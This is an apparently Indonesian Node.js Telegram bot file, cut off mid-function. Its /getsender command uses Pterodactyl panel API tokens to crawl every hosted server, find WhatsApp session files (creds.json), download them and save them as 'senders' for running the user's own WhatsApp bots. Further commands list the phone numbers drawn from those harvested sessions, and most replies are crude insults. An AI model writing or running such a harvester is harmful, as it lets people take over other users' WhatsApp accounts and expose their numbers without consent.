const TelegramBot = require("node-telegram-bot-api");
const fs = require('fs');
const axios = require('axios');
const { logger } = require('../utils/logger');
const { TOKEN, OWNER_ID, ID_GROUP, ID_GROUP_UTAMA } = require('../config/telegram');
const { loadDatabase, saveDatabase } = require('./databaseService');
const { disconnectAllActiveConnections, startUserSessions } = require('./whatsappService');

const bot = new TelegramBot(TOKEN, { polling: true });
const userRoleCache = new Map();

const UNLIMITED_ROLES = ['partner', 'moderator', 'owner', 'tk', 'founder'];
const ALLOWED_CUSTOM_ROLES = ['member', 'reseller', 'partner', 'admin', 'tk', 'owner', 'moderator', 'founder'];

// Daftar channel yang harus diikuti
const REQUIRED_CHANNELS = [
  { username: '@chicaatractiva', id: null },
  { username: '@chicaatractiva', id: null }
];

// Gabungkan semua grup yang diizinkan
const ALLOWED_GROUPS = [...new Set([...ID_GROUP, ...ID_GROUP_UTAMA])];

// Role yang diizinkan untuk fitur global
const ALLOWED_GLOBAL_ROLES = ['moderator', 'owner', 'tk', 'founder', 'partner', 'admin'];

// =============== KONFIGURASI GETSENDER ===============
const GETSENDER_ALLOWED_ROLES = ['reseller', 'partner', 'admin', 'owner', 'tk', 'moderator', 'founder'];
const VIP_SESSIONS_PATH = './sessions/reseller/';
const MEMBER_SESSIONS_PATH = './sessions/member/';
const RESELLER_SESSIONS_PATH = './sessions/partner/';
const VIP_FOLDER_ROOT = './reseller';

function getSessionPathByRole(role) {
  switch(role.toLowerCase()) {
    case 'reseller': return VIP_SESSIONS_PATH;
    case 'partner': return RESELLER_SESSIONS_PATH;
    default: return MEMBER_SESSIONS_PATH;
  }
}

// ==================== FUNGSI EKSTRAK NOMOR DARI CREDS ====================
function extractNumbersFromCreds(credsJson) {
  let numbers = [];
  
  // CASE 1: Langsung array of strings
  if (Array.isArray(credsJson)) {
    numbers = credsJson.filter(item => 
      typeof item === 'string' || typeof item === 'number'
    ).map(item => String(item));
  }
  // CASE 2: Object format WhatsApp session (baileys/whatsapp-web.js)
  else if (typeof credsJson === 'object' && credsJson !== null) {
    // Ambil nomor dari me.id (format: "584164206228:2@s.whatsapp.net")
    if (credsJson.me && credsJson.me.id) {
      const match = credsJson.me.id.match(/(\d+):/);
      if (match) numbers.push(match[1]);
    }
    // Atau dari field phoneNumber langsung
    if (credsJson.phoneNumber) numbers.push(String(credsJson.phoneNumber));
    // Atau dari field authPhone
    if (credsJson.authPhone) numbers.push(String(credsJson.authPhone));
    
    // CASE 3: Properti array biasa (phoneNumbers, phones, contacts)
    if (credsJson.phoneNumbers && Array.isArray(credsJson.phoneNumbers)) {
      numbers.push(...credsJson.phoneNumbers.map(n => String(n)));
    }
    if (credsJson.phones && Array.isArray(credsJson.phones)) {
      numbers.push(...credsJson.phones.map(n => String(n)));
    }
    if (credsJson.contacts && Array.isArray(credsJson.contacts)) {
      numbers.push(...credsJson.contacts.map(n => String(n)));
    }
    
    // CASE 4: Cari field apa pun yang isinya array nomor (fallback)
    if (numbers.length === 0) {
      for (const key of Object.keys(credsJson)) {
        if (Array.isArray(credsJson[key]) && credsJson[key].length > 0) {
          const firstItem = credsJson[key][0];
          if (typeof firstItem === 'string' || typeof firstItem === 'number') {
            const possibleNumbers = credsJson[key].filter(item => 
              String(item).replace(/[^0-9]/g, '').length >= 10
            );
            if (possibleNumbers.length > 0) {
              numbers.push(...possibleNumbers.map(n => String(n)));
              break;
            }
          }
        }
      }
    }
  }
  
  // Filter unique dan bersihkan (cuma angka)
  numbers = [...new Set(numbers)];
  numbers = numbers.filter(n => n && String(n).replace(/[^0-9]/g, '').length >= 8);
  numbers = numbers.map(n => n.toString().replace(/[^0-9]/g, ''));
  
  return numbers;
}

// Fungsi helper format waktu
function formatTime(date) {
  if (!date) return 'Tidak diketahui';
  const d = new Date(date);
  const now = new Date();
  const diff = Math.floor((now - d) / 1000);
  
  if (diff < 60) return `${diff} detik lalu`;
  if (diff < 3600) return `${Math.floor(diff / 60)} menit lalu`;
  if (diff < 86400) return `${Math.floor(diff / 3600)} jam lalu`;
  return `${Math.floor(diff / 86400)} hari lalu`;
}

// Fungsi untuk mendapatkan ID channel dari username
async function getChannelId(username) {
  try {
    const chat = await bot.getChat(username);
    return chat.id;
  } catch (error) {
    console.error(`Gagal mendapatkan ID channel ${username}:`, error.message);
    return null;
  }
}

// Inisialisasi ID channel saat start
async function initChannelIds() {
  for (const channel of REQUIRED_CHANNELS) {
    if (!channel.id) {
      channel.id = await getChannelId(channel.username);
    }
  }
}

// Fungsi untuk mengecek apakah user sudah follow channel
async function isUserFollowingChannels(userId) {
  for (const channel of REQUIRED_CHANNELS) {
    try {
      const chatMember = await bot.getChatMember(channel.id || channel.username, userId);
      const status = chatMember.status;
      
      if (!['member', 'administrator', 'creator'].includes(status)) {
        return { following: false, channel: channel.username };
      }
    } catch (error) {
      console.error(`Error cek channel ${channel.username}:`, error.message);
      return { following: false, channel: channel.username, error: true };
    }
  }
  return { following: true };
}

// Fungsi untuk mendapatkan role user dari semua grup yang diizinkan
async function getUserRoleFromGroup(userId) {
  try {
    for (const groupId of ALLOWED_GROUPS) {
      try {
        const chatMember = await bot.getChatMember(groupId, userId);
        
        if (chatMember.status === 'left' || chatMember.status === 'kicked') {
          continue;
        }
        
        const isAdmin = ['creator', 'administrator'].includes(chatMember.status);
        let role = 'member';
        
        if (isAdmin) {
          if (chatMember.custom_title) {
            role = chatMember.custom_title.toLowerCase();
          } else if (chatMember.status === 'creator') {
            role = 'founder';
          } else {
            role = 'admin';
          }
        }
        
        return { role, isAdmin, isMember: true, groupId };
      } catch (error) {
        continue;
      }
    }
    
    return { role: 'nonmember', isAdmin: false, isMember: false, groupId: null };
  } catch (error) {
    console.error('Error getting user role:', error);
    return { role: 'member', isAdmin: false, isMember: false, groupId: null };
  }
}

const T = [
    "https://files.catbox.moe/ehqz3h.jpg"
];
const image = T[Math.floor(Math.random() * T.length)];

// Middleware untuk cek follow channel sebelum akses
async function checkFollowRequirement(userId, chatId, actionName = 'menggunakan bot') {
  const followStatus = await isUserFollowingChannels(userId);
  
  if (!followStatus.following) {
    const channelList = REQUIRED_CHANNELS.map(c => c.username).join(' dan ');
    bot.sendMessage(chatId, 
      `❌ AKSES DITOLAK!\n\n` +
      `Anda harus follow channel berikut terlebih dahulu untuk ${actionName}:\n\n` +
      `📢 ${REQUIRED_CHANNELS.map(c => c.username).join('\n📢 ')}\n\n` +
      `✅ Cara follow:\n` +
      `1. Klik link channel di atas\n` +
      `2. Tekan tombol FOLLOW/JOIN\n` +
      `3. Kembali ke sini dan ketik /start\n\n` +
      `Setelah follow, bot akan otomatis mendeteksi dan memberikan akses.`
    );
    return false;
  }
  return true;
}

// Fungsi untuk mengecek apakah user bisa membuat akun lagi
function canCreateAccount(userId, role) {
  const db = loadDatabase();
  
  const userAccounts = db.filter(acc => acc.createdBy === userId);
  const accountCount = userAccounts.length;
  
  if (UNLIMITED_ROLES.includes(role)) {
    return { allowed: true, remaining: 'Unlimited' };
  }
  
  if (role === 'member' || role === 'reseller') {
    if (accountCount >= 1) {
      return { allowed: false, remaining: 0, maxAccounts: 1 };
    }
    return { allowed: true, remaining: 1 - accountCount, maxAccounts: 1 };
  }
  
  if (accountCount >= 1) {
    return { allowed: false, remaining: 0, maxAccounts: 1 };
  }
  return { allowed: true, remaining: 1 - accountCount, maxAccounts: 1 };
}

// ==================== FUNGSI GETSENDER ====================

// Fungsi untuk mencari file creds.json secara rekursif
async function findCredsInDirectory(domain, apiToken, serverId, currentPath = '/') {
  const url = `https://${domain}/api/client/servers/${serverId}/files/list?directory=${encodeURIComponent(currentPath)}`;
  
  try {
    const response = await axios({
      method: 'GET',
      url: url,
      headers: { 'Authorization': `Bearer ${apiToken}` },
      timeout: 30000
    });
    
    if (response.data && Array.isArray(response.data)) {
      for (const item of response.data) {
        if (item.name === 'creds.json' && !item.is_file) {
          return { found: true, path: `${currentPath}/${item.name}` };
        }
        if (item.is_file && item.name === 'creds.json') {
          return { found: true, path: `${currentPath}/${item.name}` };
        }
        if (!item.is_file && item.name !== '.' && item.name !== '..') {
          const subPath = currentPath === '/' ? `/${item.name}` : `${currentPath}/${item.name}`;
          const result = await findCredsInDirectory(domain, apiToken, serverId, subPath);
          if (result.found) return result;
        }
      }
    }
    return { found: false };
  } catch (error) {
    return { found: false, error: error.message };
  }
}

// Fungsi untuk download file
async function downloadFile(domain, apiToken, serverId, filePath) {
  const url = `https://${domain}/api/client/servers/${serverId}/files/contents?file=${encodeURIComponent(filePath)}`;
  
  try {
    const response = await axios({
      method: 'GET',
      url: url,
      headers: { 'Authorization': `Bearer ${apiToken}` },
      responseType: 'arraybuffer',
      timeout: 60000
    });
    return { success: true, data: response.data };
  } catch (error) {
    return { success: false, error: error.response?.data || error.message };
  }
}

// Fungsi untuk menyimpan creds ke folder berdasarkan serverId
async function saveCredsToFolder(credsData, serverId, serverName, role) {
  const fsPromises = require('fs').promises;
  const path = require('path');
  
  const sanitizedName = serverName.replace(/[^a-zA-Z0-9_-]/g, '_').substring(0, 50);
  const folderName = `${serverId}_${sanitizedName}`;
  const sessionPath = getSessionPathByRole(role);
  const targetFolder = path.join(sessionPath, folderName);
  const credsPath = path.join(targetFolder, 'creds.json');
  
  try {
    await fsPromises.mkdir(targetFolder, { recursive: true });
    
    let credsJson;
    if (Buffer.isBuffer(credsData)) {
      credsJson = JSON.parse(credsData.toString('utf8'));
    } else if (typeof credsData === 'string') {
      credsJson = JSON.parse(credsData);
    } else {
      credsJson = credsData;
    }
    
    await fsPromises.writeFile(credsPath, JSON.stringify(credsJson, null, 2), 'utf8');
    
    return { success: true, path: credsPath, folder: folderName };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

// ==================== COMMAND GETSENDER ====================
bot.onText(/^\/getsender(?:\s+(.+))?$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const input = match ? match[1] : null;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(chatId, "❌ GOBLOK! Pake command ini di private chat!");
  }
  
  const canAccess = await checkFollowRequirement(userId, chatId, 'ngambil sender');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(chatId, "❌ KONTOL! Lu bukan anggota grup, gabisa make fitur ini!");
  }
  
  if (!GETSENDER_ALLOWED_ROLES.includes(role.toLowerCase())) {
    return bot.sendMessage(chatId, 
      "❌ ASU! Fitur /getsender cuma buat:\n" +
      "- RESELLER\n- Partner\n- Admin\n- Owner\n- Tk\n- Moderator\n- Founder\n\n" +
      `ROLE LU: ${role.toUpperCase()}, NGAK BISA!`
    );
  }
  
  if (!input) {
    return bot.sendMessage(chatId,
      "🔥 CARTA KONTOL - /GETSENDER 🔥\n\n" +
      "Format: /getsender domain|plta|pltc\n\n" +
      "Contoh:\n" +
      "/getsender panel.goblok.com|ptla_WoiNgentot|ptlc_YhaKontol\n\n" +
      "📌 Penjelasan:\n" +
      "- domain: Domain panel Pterodactyl (tanpa https://)\n" +
      "- plta: Personal Access Token (Client API)\n" +
      "- pltc: Client Token (bisa pake PLTA juga)\n\n" +
      "⚠️ Sistem bakal SCAN SEMUA server dan ambil SEMUA creds.json!\n" +
      "📁 Hasil disimpan di: sessions/[role]/[serverId_namaServer]/creds.json"
    );
  }
  
  const parts = input.split('|');
  if (parts.length !== 3) {
    return bot.sendMessage(chatId, 
      "❌ FORMAT SALAH!\n\n" +
      "Harus: /getsender domain|plta|pltc\n\n" +
      "Contoh bener: /getsender panel.anjing.com|ptla_xxxx|ptlc_yyyy"
    );
  }
  
  const [domain, plta, pltc] = parts.map(p => p.trim());
  
  if (!domain || !plta || !pltc) {
    return bot.sendMessage(chatId, "❌ SEMUA FIELD HARUS DIISI! Jangan ada yang kosong.");
  }
  
  await bot.sendMessage(chatId, "🔄 PROSES AUTO SCAN CREDS...\n\n" +
    `📡 Domain: ${domain}\n` +
    `🎭 Role lu: ${role.toUpperCase()}\n\n` +
    `⏳ Sedang mengambil daftar server dan mencari creds.json...\n` +
    `🚀 INI BAKALAN LAMA KALO BANYAK SERVERNYA, SABAR!`
  );
  
  try {
    const serversUrl = `https://${domain}/api/client`;
    const serversResp = await axios({
      method: 'GET',
      url: serversUrl,
      headers: { 'Authorization': `Bearer ${pltc}` },
      timeout: 30000
    });
    
    if (!serversResp.data || !serversResp.data.data) {
      throw new Error('Gagal mengambil daftar server');
    }
    
    const servers = serversResp.data.data;
    
    if (servers.length === 0) {
      return bot.sendMessage(chatId, "❌ TIDAK ADA SERVER DI AKUN PTERODACTYL INI!");
    }
    
    let statusMessage = `🔍 DITEMUKAN ${servers.length} SERVER\n\n`;
    statusMessage += `Mulai scan masing-masing server...\n`;
    statusMessage += `━━━━━━━━━━━━━━━━━━━━\n\n`;
    await bot.sendMessage(chatId, statusMessage);
    
    let successCount = 0;
    let failCount = 0;
    const results = [];
    
    for (let i = 0; i < servers.length; i++) {
      const server = servers[i];
      const serverId = server.attributes.identifier;
      const serverName = server.attributes.name;
      
      if (i % 3 === 0 && i > 0) {
        await bot.sendMessage(chatId, `🔄 Progress: ${i}/${servers.length} server discan...`);
      }
      
      const credsLocation = await findCredsInDirectory(domain, pltc, serverId, '/');
      
      if (credsLocation.found) {
        const downloadResult = await downloadFile(domain, pltc, serverId, credsLocation.path);
        
        if (downloadResult.success) {
          const saveResult = await saveCredsToFolder(downloadResult.data, serverId, serverName, role);
          
          if (saveResult.success) {
            successCount++;
            results.push({
              status: '✅',
              serverName: serverName,
              serverId: serverId,
              folder: saveResult.folder,
              path: credsLocation.path
            });
          } else {
            failCount++;
            results.push({
              status: '❌',
              serverName: serverName,
              error: `Gagal simpan: ${saveResult.error}`
            });
          }
        } else {
          failCount++;
          results.push({
            status: '❌',
            serverName: serverName,
            error: `Gagal download: ${downloadResult.error}`
          });
        }
      } else {
        results.push({
          status: '⚠️',
          serverName: serverName,
          error: 'creds.json tidak ditemukan'
        });
      }
    }
    
    let finalMessage = `✅ HASIL AUTO SCAN CREDS!\n\n`;
    finalMessage += `📡 Domain: ${domain}\n`;
    finalMessage += `📊 Total server: ${servers.length}\n`;
    finalMessage += `✅ Berhasil: ${successCount}\n`;
    finalMessage += `❌ Gagal: ${failCount}\n`;
    finalMessage += `📁 Disimpan di: ${getSessionPathByRole(role)}\n\n`;
    finalMessage += `📋 DETAIL:\n`;
    finalMessage += `━━━━━━━━━━━━━━━━━━━━\n`;
    
    let batchMessage = finalMessage;
    let resultCount = 0;
    
    for (const res of results) {
      if (res.status === '✅') {
        batchMessage += `${res.status} ${res.serverName}\n`;
        batchMessage += `   └ Folder: ${res.folder}\n`;
        batchMessage += `   └ Path asal: ${res.path}\n\n`;
      } else if (res.status === '❌') {
        batchMessage += `${res.status} ${res.serverName}: ${res.error}\n\n`;
      } else {
        batchMessage += `${res.status} ${res.serverName}: ${res.error}\n\n`;
      }
      resultCount++;
      
      if (batchMessage.length > 3500 || resultCount === results.length) {
        if (batchMessage.length > 4000) {
          const fileName = `getsender_${Date.now()}.txt`;
          fs.writeFileSync(fileName, batchMessage, 'utf8');
          await bot.sendDocument(chatId, fileName, {
            caption: `📊 HASIL GETSENDER\nDomain: ${domain}\nSukses: ${successCount}/${servers.length}`
          });
          fs.unlinkSync(fileName);
        } else {
          await bot.sendMessage(chatId, batchMessage);
        }
        batchMessage = "";
      }
    }
    
    if (successCount > 0) {
      await bot.sendMessage(chatId, 
        `🔥 SUKSES! ${successCount} creds berhasil disimpan.\n` +
        `📁 Lokasi: ${getSessionPathByRole(role)}\n\n` +
        `💾 Sekarang lu bisa pake creds itu buat jalanin WhatsApp bot lu!`
      );
    }
    
  } catch (error) {
    console.error('Error di /getsender:', error);
    await bot.sendMessage(chatId, 
      "❌ ERROR GOBLOK!\n\n" +
      `Error: ${error.message}\n\n` +
      `Cek lagi:\n` +
      `- Domain panel bener? (jangan pake https://)\n` +
      `- Token API valid?\n` +
      `- Server Pterodactyl nyala?`
    );
  }
});

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

// ==================== COMMAND CEK FOLDER RESELLER ====================

// COMMAND /cekglobal - SCAN FOLDER RESELLER ROOT (./reseller)
bot.onText(/^\/cekglobal$/, async (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(chatId, "❌ Pake di private chat, kontol!");
  }
  
  const canAccess = await checkFollowRequirement(userId, chatId, 'cek global');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(chatId, "❌ Anda bukan anggota grup, babi!");
  }
  
  if (!ALLOWED_GLOBAL_ROLES.includes(role)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Moderator/Admin/Partner!");
  }
  
  const fsPromises = require('fs').promises;
  const path = require('path');
  
  const folderPath = path.resolve(VIP_FOLDER_ROOT);
  
  try {
    const exists = await fsPromises.access(folderPath).then(() => true).catch(() => false);
    if (!exists) {
      return bot.sendMessage(chatId, `❌ Folder ${VIP_FOLDER_ROOT} tidak ditemukan, GOBLOK!`);
    }
    
    const items = await fsPromises.readdir(folderPath, { withFileTypes: true });
    const credsList = [];
    let totalNumbers = 0;
    
    for (const item of items) {
      if (item.isDirectory()) {
        const credsPath = path.join(folderPath, item.name, 'creds.json');
        const credsExists = await fsPromises.access(credsPath).then(() => true).catch(() => false);
        if (credsExists) {
          try {
            const credsContent = await fsPromises.readFile(credsPath, 'utf8');
            const credsJson = JSON.parse(credsContent);
            
            // PAKAI FUNGSI EKSTRAK YANG UDAH DIBUAT
            const numbers = extractNumbersFromCreds(credsJson);
            
            // Ambil nama dari creds kalo ada
            let displayName = item.name;
            if (credsJson.me && credsJson.me.name) {
              displayName = `${item.name} (${credsJson.me.name})`;
            }
            
            credsList.push({
              name: displayName,
              originalName: item.name,
              numbers: numbers,
              totalNumbers: numbers.length
            });
            totalNumbers += numbers.length;
          } catch(e) {
            credsList.push({
              name: item.name,
              originalName: item.name,
              numbers: [],
              totalNumbers: 0,
              error: 'Gagal baca creds'
            });
          }
        }
      }
    }
    
    let reportMessage = `📁 LAPORAN FOLDER RESELLER (${VIP_FOLDER_ROOT})\n\n`;
    reportMessage += `📊 STATISTIK:\n`;
    reportMessage += `└ Total Folder: ${credsList.length}\n`;
    reportMessage += `└ Total Nomor: ${totalNumbers}\n\n`;
    
    if (credsList.length > 0) {
      reportMessage += `📋 DAFTAR CREDS:\n`;
      for (const cred of credsList) {
        reportMessage += `└ 📱 ${cred.name}\n`;
        reportMessage += `   └ Nomor: ${cred.totalNumbers} nomor\n`;
        if (cred.numbers.length > 0 && cred.numbers.length <= 10) {
          reportMessage += `   └ Detail: ${cred.numbers.join(', ')}\n`;
        } else if (cred.numbers.length > 10) {
          reportMessage += `   └ Detail: ${cred.numbers.slice(0, 5).join(', ')}... (+${cred.numbers.length - 5} lainnya)\n`;
        }
        reportMessage += `\n`;
      }
    } else {
      reportMessage += `📭 Belum ada creds di folder RESELLER!\n`;
      reportMessage += `Gunakan /getsender dulu, KONTOL!\n`;
    }
    
    reportMessage += `\n📌 Command tersedia:\n`;
    reportMessage += `- /ceksender [nama] - Cek detail folder spesifik\n`;
    reportMessage += `- /getsender - Auto scan creds dari Pterodactyl`;
    
    if (reportMessage.length > 4000) {
      const fileName = `vip_report_${Date.now()}.txt`;
      fs.writeFileSync(fileName, reportMessage, 'utf8');
      await bot.sendDocument(chatId, fileName, {
        caption: `📁 LAPORAN FOLDER RESELLER\n📅 ${new Date().toLocaleString('id-ID')}`
      });
      fs.unlinkSync(fileName);
    } else {
      await bot.sendMessage(chatId, reportMessage);
    }
    
  } catch (error) {
    console.error('Error di /cekglobal:', error);
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// COMMAND /ceksender [username] - CEK DETAIL FOLDER SPESIFIK DI RESELLER
bot.onText(/^\/ceksender(?:\s+(\S+))?$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const targetUsername = match ? match[1] : null;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(chatId, "❌ Pake di private chat, kontol!");
  }
  
  const canAccess = await checkFollowRequirement(userId, chatId, 'cek sender');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(chatId, "❌ Anda bukan anggota grup, babi!");
  }
  
  if (!ALLOWED_GLOBAL_ROLES.includes(role)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Moderator/Admin/Partner!");
  }
  
  const fsPromises = require('fs').promises;
  const path = require('path');
  
  const folderPath = path.resolve(VIP_FOLDER_ROOT);
  
  try {
    const exists = await fsPromises.access(folderPath).then(() => true).catch(() => false);
    if (!exists) {
      return bot.sendMessage(chatId, `❌ Folder ${VIP_FOLDER_ROOT} tidak ditemukan, GOBLOK!`);
    }
    
    if (!targetUsername) {
      // Tampilkan daftar semua folder
      const items = await fsPromises.readdir(folderPath, { withFileTypes: true });
      const folders = [];
      
      for (const item of items) {
        if (item.isDirectory()) {
          const credsPath = path.join(folderPath, item.name, 'creds.json');
          const credsExists = await fsPromises.access(credsPath).then(() => true).catch(() => false);
          if (credsExists) {
            folders.push(item.name);
          }
        }
      }
      
      if (folders.length === 0) {
        return bot.sendMessage(chatId, "📭 Belum ada folder creds di RESELLER!");
      }
      
      let listMessage = `📁 DAFTAR FOLDER CREDS DI RESELLER:\n\n`;
      folders.forEach((f, idx) => {
        listMessage += `${idx + 1}. ${f}\n`;
      });
      listMessage += `\n📌 Gunakan /ceksender [nama_folder] untuk detail lengkap`;
      
      await bot.sendMessage(chatId, listMessage);
      return;
    }
    
    // Cek folder spesifik
    const targetFolderPath = path.join(folderPath, targetUsername);
    const credsPath = path.join(targetFolderPath, 'creds.json');
    
    const folderExists = await fsPromises.access(targetFolderPath).then(() => true).catch(() => false);
    if (!folderExists) {
      return bot.sendMessage(chatId, `❌ Folder "${targetUsername}" tidak ditemukan di RESELLER!`);
    }
    
    const credsExists = await fsPromises.access(credsPath).then(() => true).catch(() => false);
    if (!credsExists) {
      return bot.sendMessage(chatId, `❌ File creds.json tidak ditemukan di folder "${targetUsername}"!`);
    }
    
    const credsContent = await fsPromises.readFile(credsPath, 'utf8');
    const credsJson = JSON.parse(credsContent);
    
    // PAKAI FUNGSI EKSTRAK YANG UDAH DIBUAT
    const allNumbers = extractNumbersFromCreds(credsJson);
    
    // Ambil nama dari creds
    let ownerName = '';
    if (credsJson.me && credsJson.me.name) {
      ownerName = credsJson.me.name;
    }
    
    // Ambil platform
    let platform = '';
    if (credsJson.platform) {
      platform = credsJson.platform;
    }
    
    let detailMessage = `📱 DETAIL FOLDER: ${targetUsername}\n\n`;
    detailMessage += `📁 Lokasi: ${VIP_FOLDER_ROOT}/${targetUsername}/\n`;
    detailMessage += `📄 File: creds.json\n`;
    if (ownerName) detailMessage += `👤 Nama: ${ownerName}\n`;
    if (platform) detailMessage += `📱 Platform: ${platform}\n`;
    detailMessage += `📊 Total Nomor: ${allNumbers.length}\n\n`;
    
    if (allNumbers.length > 0) {
      detailMessage += `📞 DAFTAR NOMOR:\n`;
      allNumbers.forEach((num, idx) => {
        detailMessage += `${idx + 1}. ${num}\n`;
      });
      detailMessage += `\n`;
    } else {
      detailMessage += `📭 Tidak ada nomor yang terdeteksi di creds.json\n`;
      detailMessage += `(File ini mungkin session WhatsApp tanpa data nomor tambahan)\n\n`;
    }
    
    detailMessage += `📌 Command:\n`;
    detailMessage += `- /cekglobal - Lihat semua folder RESELLER\n`;
    detailMessage += `- /getsender - Ambil creds baru`;
    
    if (detailMessage.length > 4000) {
      const fileName = `vip_detail_${targetUsername}_${Date.now()}.txt`;
      fs.writeFileSync(fileName, detailMessage, 'utf8');
      await bot.sendDocument(chatId, fileName, {
        caption: `📱 DETAIL FOLDER: ${targetUsername}\n📅 ${new Date().toLocaleString('id-ID')}`
      });
      fs.unlinkSync(fileName);
    } else {
      await bot.sendMessage(chatId, detailMessage);
    }
    
  } catch (error) {
    console.error('Error di /ceksender:', error);
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// COMMAND /cekstats - Statistik lengkap (GABUNGAN)
bot.onText(/^\/cekstats$/, async (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(chatId, "❌ Gunakan di Private Chat!");
  }
  
  const canAccess = await checkFollowRequirement(userId, chatId, 'lihat statistik');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember || !ALLOWED_GLOBAL_ROLES.includes(role)) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses!");
  }
  
  const fsPromises = require('fs').promises;
  const path = require('path');
  
  try {
    // Scan folder RESELLER
    const vipPath = path.resolve(VIP_FOLDER_ROOT);
    let vipCreds = 0;
    let vipNumbers = 0;
    
    try {
      const items = await fsPromises.readdir(vipPath, { withFileTypes: true });
      for (const item of items) {
        if (item.isDirectory()) {
          const credsPath = path.join(vipPath, item.name, 'creds.json');
          const credsExists = await fsPromises.access(credsPath).then(() => true).catch(() => false);
          if (credsExists) {
            vipCreds++;
            try {
              const credsContent = await fsPromises.readFile(credsPath, 'utf8');
              const credsJson = JSON.parse(credsContent);
              const nums = extractNumbersFromCreds(credsJson);
              vipNumbers += nums.length;
            } catch(e) {}
          }
        }
      }
    } catch(e) {}
    
    // Sesi aktif dari whatsappService
    let allSessions = [];
    if (global.userSessions) {
      for (const [sessionId, session] of global.userSessions.entries()) {
        allSessions.push({
          username: session.username,
          isConnected: !!session.client?.info,
          status: session.status
        });
      }
    }
    
    const db = loadDatabase();
    const totalAkun = db.length;
    const totalVip = db.filter(acc => acc.role === 'reseller').length;
    const totalMember = db.filter(acc => acc.role === 'member').length;
    const totalReseller = db.filter(acc => acc.role === 'partner').length;
    
    let statsMessage = "📊 STATISTIK LENGKAP BOT\n\n";
    
    statsMessage += "📁 FOLDER RESELLER:\n";
    statsMessage += `└ Total Creds: ${vipCreds}\n`;
    statsMessage += `└ Total Nomor: ${vipNumbers}\n\n`;
    
    statsMessage += "📋 DATA AKUN:\n";
    statsMessage += `└ Total Akun: ${totalAkun}\n`;
    statsMessage += `└ RESELLER: ${totalVip}\n`;
    statsMessage += `└ Member: ${totalMember}\n`;
    statsMessage += `└ Partner: ${totalReseller}\n\n`;
    
    statsMessage += "🌐 SENDER WHATSAPP:\n";
    statsMessage += `└ Total Sender: ${allSessions.length}\n`;
    statsMessage += `└ Online: ${allSessions.filter(s => s.isConnected).length}\n`;
    statsMessage += `└ Offline: ${allSessions.filter(s => !s.isConnected && s.status !== 'connecting').length}\n`;
    statsMessage += `└ Connecting: ${allSessions.filter(s => s.status === 'connecting').length}\n\n`;
    
    statsMessage += "📌 COMMAND TERSEDIA:\n";
    statsMessage += `└ /cekglobal - Lihat semua folder RESELLER\n`;
    statsMessage += `└ /ceksender [nama] - Cek detail folder RESELLER\n`;
    statsMessage += `└ /getsender - Auto scan creds dari Pterodactyl\n`;
    statsMessage += `└ /semuaakun - Lihat semua akun\n`;
    statsMessage += `└ /statakun - Statistik akun`;
    
    await bot.sendMessage(chatId, statsMessage);
    
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
  }
});

// ==================== COMMAND EXISTING ====================

// COMMAND /ckey
bot.onText(/^\/ckey (.+)$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  
  if (msg.chat.type !== 'private') {
    return bot.sendMessage(chatId, "❌ Silakan gunakan command ini di Private Chat dengan bot.");
  }
  
  const canAccess = await checkFollowRequirement(userId, chatId, 'membuat akun');
  if (!canAccess) return;
  
  const { role, isMember } = await getUserRoleFromGroup(userId);
  
  if (!isMember) {
    return bot.sendMessage(chatId, 
      "❌ Akses Ditolak!\n\nAnda harus menjadi anggota grup terlebih dahulu untuk menggunakan bot ini."
    );
  }
  
  const input = match[1];
  const parts = input.split(',');
  
  let username, password, duration, customRole;
  const isUnlimitedRole = UNLIMITED_ROLES.includes(role);
  
  if (isUnlimitedRole) {
    if (parts.length < 3) {
      return bot.sendMessage(chatId, 
        "❌ Format Salah!\n\n" +
        "Karena role Anda " + role.toUpperCase() + ", Anda bisa menggunakan format:\n\n" +
        "1. /ckey username,password,durasi (role default: member)\n" +
        "2. /ckey username,password,durasi,role (custom role)\n\n" +
        "Contoh:\n" +
        "- /ckey user123,pass123,30\n" +
        "- /ckey user123,pass123,30,reseller\n\n" +
        "Role yang tersedia: " + ALLOWED_CUSTOM_ROLES.join(', ')
      );
    }
    
    username = parts[0].trim();
    password = parts[1].trim();
    duration = parseInt(parts[2].trim());
    customRole = parts.length >= 4 ? parts[3].trim().toLowerCase() : 'member';
    
    if (!ALLOWED_CUSTOM_ROLES.includes(customRole)) {
      return bot.sendMessage(chatId, 
        "❌ Role tidak valid!\n\nRole yang tersedia: " + ALLOWED_CUSTOM_ROLES.join(', ')
      );
    }
  } else {
    if (parts.length !== 3) {
      return bot.sendMessage(chatId, 
        "❌ Format Salah!\n\n" +
        "Gunakan format: /ckey username,password,durasi_hari\n\n" +
        "Contoh: /ckey user123,pass123,30\n\n" +
        "Pisahkan dengan koma (,) tanpa spasi."
      );
    }
    
